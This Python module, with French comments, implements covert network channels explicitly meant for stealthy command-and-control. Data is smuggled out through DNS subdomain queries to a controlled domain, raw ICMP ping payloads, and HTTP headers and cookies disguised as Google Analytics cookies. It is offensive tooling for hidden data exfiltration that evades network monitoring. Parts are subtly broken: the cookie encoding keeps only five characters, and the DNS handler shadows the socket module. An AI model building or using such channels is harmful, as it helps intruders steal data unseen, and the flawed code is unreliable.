#!/usr/bin/env python3
"""
Network Steganography Module
- DNS Covert Channels
- ICMP Tunneling
- HTTP Steganography
"""

import socket
import struct
import time
import random
import base64
import hashlib
import requests  # <-- IMPORT AJOUTÉ
from typing import Optional, List, Dict, Callable
import threading
import subprocess

class DNSCovertChannel:
    """
    DNS Tunneling pour C2 furtif
    Cache des données dans les requêtes DNS
    """
    
    def __init__(self, domain: str, dns_server: str = '8.8.8.8'):
        self.domain = domain
        self.dns_server = dns_server
        self.session_id = random.randint(1, 65535)
        self.chunk_size = 32  # Caractères par chunk (limite DNS)
    
    def encode_data(self, data: bytes) -> List[str]:
        """
        Encode des bytes en sous-domaines valides
        """
        # Base32 pour avoir que des caractères DNS valides
        b32 = base64.b32encode(data).decode().lower().replace('=', '')
        
        # Diviser en chunks
        chunks = []
        for i in range(0, len(b32), self.chunk_size):
            chunk = b32[i:i+self.chunk_size]
            chunks.append(chunk)
        
        return chunks
    
    def decode_data(self, chunks: List[str]) -> bytes:
        """
        Décode les chunks en bytes
        """
        combined = ''.join(chunks).upper()
        # Ajouter padding si nécessaire
        padding = 8 - (len(combined) % 8)
        if padding != 8:
            combined += '=' * padding
        
        return base64.b32decode(combined)
    
    def send_query(self, subdomain: str) -> Optional[str]:
        """
        Envoie une requête DNS et récupère la réponse
        """
        query = f"{subdomain}.{self.domain}"
        try:
            # Utiliser nslookup ou socket directement
            result = subprocess.run(
                ['nslookup', query, self.dns_server],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            # Extraire la réponse (simplifié)
            if 'Address:' in result.stdout:
                lines = result.stdout.split('\n')
                for line in lines:
                    if 'Address:' in line and not '#' in line:
                        ip = line.split('Address:')[1].strip()
                        return ip
            return None
            
        except:
            return None
    
    def send_data(self, data: bytes) -> bool:
        """
        Envoie des données via DNS queries
        """
        chunks = self.encode_data(data)
        
        for i, chunk in enumerate(chunks):
            # Format: <session>.<seq>.<chunk>.<domain>
            subdomain = f"{self.session_id:x}.{i:x}.{chunk}"
            response = self.send_query(subdomain)
            
            if response:
                print(f"[✓] Chunk {i}/{len(chunks)} envoyé: {response}")
            else:
                print(f"[!] Échec chunk {i}")
                return False
            
            time.sleep(0.5)  # Éviter rate limiting
        
        # Envoyer marqueur de fin
        self.send_query(f"{self.session_id:x}.end")
        return True
    
    def start_server(self, callback: Callable[[bytes], None]):
        """
        Démarre un serveur DNS factice (simplifié)
        Nécessite des privilèges root
        """
        import socketserver
        
        class DNSHandler(socketserver.BaseRequestHandler):
            def handle(self):
                data, socket = self.request
                
                # Parse requête DNS simplifié
                if len(data) > 20:
                    qname = data[12:].split(b'\x00')[0]
                    try:
                        domain = qname.decode()
                        print(f"[DNS] Query: {domain}")
                        
                        # Extraire session, seq, data
                        parts = domain.split('.')
                        if len(parts) >= 3:
                            session = parts[0]
                            seq = parts[1]
                            chunk = parts[2]
                            
                            # Répondre avec une IP factice
                            response = self._build_response(data, '1.2.3.4')
                            socket.sendto(response, self.client_address)
                            
                            if seq == 'end':
                                print(f"[✓] Session {session} terminée")
                    except:
                        pass
            
            def _build_response(self, query, ip):
                # Construire réponse DNS simplifiée
                transaction_id = query[:2]
                flags = b'\x81\x80'  # Standard response, no error
                questions = query[4:6]
                answer_rrs = b'\x00\x01'
                authority_rrs = b'\x00\x00'
                additional_rrs = b'\x00\x00'
                
                # Réponse
                response = (transaction_id + flags + questions + answer_rrs + 
                           authority_rrs + additional_rrs + query[12:])
                
                # Ajouter la réponse IP
                response += b'\xc0\x0c'  # Compression pointer
                response += b'\x00\x01'  # Type A
                response += b'\x00\x01'  # Class IN
                response += struct.pack('>I', 300)  # TTL
                response += b'\x00\x04'  # Data length
                response += socket.inet_aton(ip)
                
                return response
        
        # Démarrer le serveur DNS sur le port 53 (nécessite root)
        print("[*] Démarrage serveur DNS sur port 53...")
        server = socketserver.UDPServer(("0.0.0.0", 53), DNSHandler)
        server.serve_forever()


class ICMPCovertChannel:
    """
    ICMP Tunneling - Cache des données dans les paquets ping
    """
    
    def __init__(self, target: str):
        self.target = target
        self.seq = 0
    
    def send_ping(self, data: bytes) -> bool:
        """
        Envoie un ping avec payload personnalisé
        """
        try:
            # Créer socket raw ICMP (nécessite root)
            icmp = socket.getprotobyname('icmp')
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)
            
            # Construire paquet ICMP Echo Request
            packet = self._build_icmp_packet(data)
            
            # Envoyer
            sock.sendto(packet, (self.target, 0))
            sock.close()
            return True
            
        except Exception as e:
            print(f"[!] ICMP error: {e}")
            return False
    
    def _build_icmp_packet(self, data: bytes) -> bytes:
        """
        Construit un paquet ICMP Echo Request
        """
        # Type (8), Code (0), Checksum, ID, Sequence
        icmp_type = 8  # Echo Request
        icmp_code = 0
        icmp_id = 0x1234
        icmp_seq = self.seq
        self.seq += 1
        
        # En-tête ICMP + données
        header = struct.pack('!BBHHH', icmp_type, icmp_code, 0, icmp_id, icmp_seq)
        
        # Calculer checksum
        checksum = self._checksum(header + data)
        header = struct.pack('!BBHHH', icmp_type, icmp_code, checksum, icmp_id, icmp_seq)
        
        return header + data
    
    def _checksum(self, data: bytes) -> int:
        """
        Calcule le checksum ICMP
        """
        if len(data) % 2:
            data += b'\x00'
        
        s = sum(struct.unpack('!%dH' % (len(data) // 2), data))
        s = (s >> 16) + (s & 0xffff)
        s += s >> 16
        
        return ~s & 0xffff
    
    def listen(self, callback: Callable[[bytes], None]):
        """
        Écoute les paquets ICMP (sniffing)
        """
        try:
            icmp = socket.getprotobyname('icmp')
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)
            
            while True:
                packet, addr = sock.recvfrom(65565)
                # Parse ICMP
                if len(packet) > 28:  # IP header (20) + ICMP header (8)
                    icmp_type = packet[20]
                    
                    if icmp_type == 8:  # Echo Request
                        data = packet[28:]  # Skip headers
                        callback(data)
                        
        except Exception as e:
            print(f"[!] ICMP listen error: {e}")


class HTTPSteganography:
    """
    HTTP Steganography - Cache dans headers, cookies, URLs
    """
    
    def __init__(self, server_url: str):
        self.server_url = server_url
        self.session = requests.Session()
    
    def embed_in_headers(self, data: bytes) -> dict:
        """
        Cache des données dans les headers HTTP
        """
        headers = {}
        b64 = base64.b64encode(data).decode()
        
        # Diviser en plusieurs headers
        chunk_size = 20
        for i in range(0, len(b64), chunk_size):
            chunk = b64[i:i+chunk_size]
            headers[f'X-Custom-{i}'] = chunk
        
        return headers
    
    def extract_from_headers(self, headers: dict) -> Optional[bytes]:
        """
        Extrait les données des headers
        """
        chunks = []
        i = 0
        while f'X-Custom-{i}' in headers:
            chunks.append(headers[f'X-Custom-{i}'])
            i += 1
        
        if chunks:
            b64 = ''.join(chunks)
            return base64.b64decode(b64)
        return None
    
    def embed_in_cookies(self, data: bytes) -> dict:
        """
        Cache dans les cookies
        """
        cookies = {}
        b64 = base64.b64encode(data).decode()
        
        # Cookie names: __utm[a-z] (comme Google Analytics)
        cookie_names = ['__utma', '__utmb', '__utmc', '__utmt', '__utmz']
        
        for i, name in enumerate(cookie_names):
            if i < len(b64):
                cookies[name] = b64[i]
        
        return cookies
    
    def extract_from_cookies(self, cookies: dict) -> Optional[bytes]:
        """
        Extrait des cookies
        """
        cookie_names = ['__utma', '__utmb', '__utmc', '__utmt', '__utmz']
        chars = []
        
        for name in cookie_names:
            if name in cookies:
                chars.append(cookies[name])
        
        if chars:
            b64 = ''.join(chars)
            return base64.b64decode(b64)
        return None
    
    def send_get(self, path: str, data: bytes = None) -> 'requests.Response':
        """
        Envoie une requête GET avec données cachées
        """
        headers = self.embed_in_headers(data) if data else {}
        return requests.get(f"{self.server_url}{path}", headers=headers)
    
    def send_post(self, path: str, data: bytes) -> 'requests.Response':
        """
        Envoie une requête POST avec données cachées
        """
        headers = self.embed_in_headers(data)
        return requests.post(f"{self.server_url}{path}", headers=headers)